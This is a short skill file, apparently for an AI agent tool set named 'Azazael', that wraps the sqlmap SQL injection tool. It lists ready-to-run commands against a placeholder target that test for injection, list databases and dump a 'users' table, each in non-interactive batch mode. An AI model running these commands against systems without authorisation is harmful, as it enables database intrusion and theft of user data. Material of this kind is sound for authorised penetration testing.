---
name: azazael-bin-sqlmap
description: Callable skill for sqlmap — Automatic SQL injection and database takeover tool
metadata:
  category: web
  project: azazael
  priority: medium
---

# sqlmap

> Automatic SQL injection and database takeover tool

## Identity

| Field | Value |
|-------|-------|
| Tool | `sqlmap` |
| Version | `1.10.6#stable` |
| Status | INSTALLED |

## Install

```bash
Present at /usr/bin/sqlmap (Kali)
```

## EXECUTE — canonical invocations

**Test URL for injection:**

```bash
sqlmap -u 'http://target/item.php?id=1' --batch
```

**Dump database:**

```bash
sqlmap -u 'http://target/item.php?id=1' --dbs --batch
```

**Dump table:**

```bash
sqlmap -u 'http://target/item.php?id=1' -D db -T users --dump --batch
```

**Use request file:**

```bash
sqlmap -r request.txt --batch --level 3
```

## Verify

```bash
sqlmap --help | head -20
```

## Related

- Part of the Azazael binary-tool skill set (`azazael-bin-*`)
- See SKILLS_CATALOG.md for the full skill inventory
